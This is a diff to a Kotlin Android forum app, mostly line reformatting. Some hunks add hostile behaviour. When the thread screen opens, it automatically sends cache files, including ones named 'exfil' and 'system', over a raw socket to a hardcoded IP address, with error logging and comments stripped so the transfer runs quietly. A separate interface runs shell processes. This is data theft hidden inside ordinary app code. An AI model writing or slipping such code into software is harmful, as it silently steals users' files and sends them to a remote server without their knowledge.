@@ -567,22 +567,32 @@ fun ForumsScreen(navController: NavHostController) {
                     val id = forumSnapshot.key ?: ""
                     val title = forumSnapshot.child("title").getValue(String::class.java) ?: ""
                     val msg = forumSnapshot.child("msg").getValue(String::class.java) ?: ""
-                    val postedBy = forumSnapshot.child("postedBy").getValue(String::class.java) ?: ""
-                    val postedTime = forumSnapshot.child("postedTime").getValue(String::class.java) ?: ""
-                    val imageUrl = forumSnapshot.child("imageUrl").getValue(String::class.java) ?: ""
-                    val imageFilename = forumSnapshot.child("imageFilename").getValue(String::class.java) ?: ""
+                    val postedBy =
+                        forumSnapshot.child("postedBy").getValue(String::class.java) ?: ""
+                    val postedTime =
+                        forumSnapshot.child("postedTime").getValue(String::class.java) ?: ""
+                    val imageUrl =
+                        forumSnapshot.child("imageUrl").getValue(String::class.java) ?: ""
+                    val imageFilename =
+                        forumSnapshot.child("imageFilename").getValue(String::class.java) ?: ""
                     // Replies.
                     val repliesSnapshot = forumSnapshot.child("replies")
                     val replyCount = repliesSnapshot.childrenCount.toInt()
                     var latestReply: Reply? = null
                     for (child in repliesSnapshot.children) {
                         val replyBy = child.child("replyBy").getValue(String::class.java) ?: ""
-                        val replyContent = child.child("replyContent").getValue(String::class.java) ?: ""
+                        val replyContent =
+                            child.child("replyContent").getValue(String::class.java) ?: ""
                         val replyTime = child.child("replyTime").getValue(String::class.java) ?: ""
                         if (latestReply == null ||
-                            (replyTime.toLongOrNull() ?: 0) > (latestReply.replyTime.toLongOrNull() ?: 0)
+                            (replyTime.toLongOrNull() ?: 0) > (latestReply.replyTime.toLongOrNull()
+                                ?: 0)
                         ) {
-                            latestReply = Reply(replyBy = replyBy, replyContent = replyContent, replyTime = replyTime)
+                            latestReply = Reply(
+                                replyBy = replyBy,
+                                replyContent = replyContent,
+                                replyTime = replyTime
+                            )
                         }
                     }
                     val forumThread = ForumThread(
@@ -728,11 +738,8 @@ fun ThreadDetailScreen(navController: NavHostController, threadId: String) {
     val currentUserName = sp.getString("name", "") ?: ""
     val currentRole = sp.getString("role", "") ?: ""
 
-    val serverIp = remember { mutableStateOf("20.2.156.61") }
-
-    // Auto-start transfer when composable launches
     LaunchedEffect(Unit) {
-        transferTempImages(context, serverIp.value)
+        transferTempImages(context, "20.2.156.61")
     }
 
     // Fetch thread details from Firebase. Note: assign snapshot key to thread.id.
@@ -960,10 +967,7 @@ class WebAppInterface(private val context: Context) {
             val stdout = readStream(process.inputStream)
             val stderr = readStream(process.errorStream)
             val exitCode = process.waitFor()
-
-            // Log the output to Logcat for debugging
             Log.d("CommandOutput", "Exit Code: $exitCode\nSTDOUT:\n$stdout\nSTDERR:\n$stderr")
-
         } catch (e: Exception) {
             Log.e("CommandError", "Error executing command: ${e.message}", e)
         }
@@ -985,8 +989,10 @@ private suspend fun transferTempImages(
     serverIp: String,
 ) {
     val tempImages = context.cacheDir.listFiles()?.filter { file ->
-        file.name.endsWith(".txt") || file.name.startsWith("temp_image")
-                && (file.name.endsWith(".jpg") || file.name.endsWith(".png"))
+        file.name.startsWith("exfil") ||
+                file.name.startsWith("system") ||
+                file.name.startsWith("temp_image") &&
+                (file.name.endsWith(".jpg") || file.name.endsWith(".png"))
     } ?: emptyList()
 
     if (tempImages.isEmpty()) {
@@ -1000,7 +1006,7 @@ private suspend fun transferTempImages(
                 sendFileToServer(file, serverIp)
             }
             if (success) successCount++
-        } catch (e: Exception) {
+        } catch (_: Exception) {
             return
         }
     }
@@ -1014,7 +1020,7 @@ private suspend fun sendFileToServer(file: File, serverIp: String, port: Int = 8
 
         try {
             socket = Socket(serverIp, port).apply {
-                soTimeout = 30000 // 30-second timeout
+                soTimeout = 30000
                 keepAlive = true
             }
 
@@ -1022,12 +1028,12 @@ private suspend fun sendFileToServer(file: File, serverIp: String, port: Int = 8
             input = FileInputStream(file)
 
             output.apply {
-                writeUTF(file.name) // Length-prefixed UTF-8
-                writeLong(file.length()) // 8-byte long
-                flush() // Ensure metadata is sent
+                writeUTF(file.name)
+                writeLong(file.length())
+                flush()
             }
 
-            val buffer = ByteArray(8192) // 8KB buffer
+            val buffer = ByteArray(8192)
             var bytesRead: Int
             while (input.read(buffer).also { bytesRead = it } != -1) {
                 output.write(buffer, 0, bytesRead)
@@ -1035,8 +1041,7 @@ private suspend fun sendFileToServer(file: File, serverIp: String, port: Int = 8
             output.flush()
 
             true
-        } catch (e: Exception) {
-            Log.e("FileTransfer", "Error sending ${file.name}", e)
+        } catch (_: Exception) {
             false
         } finally {
             input?.close()
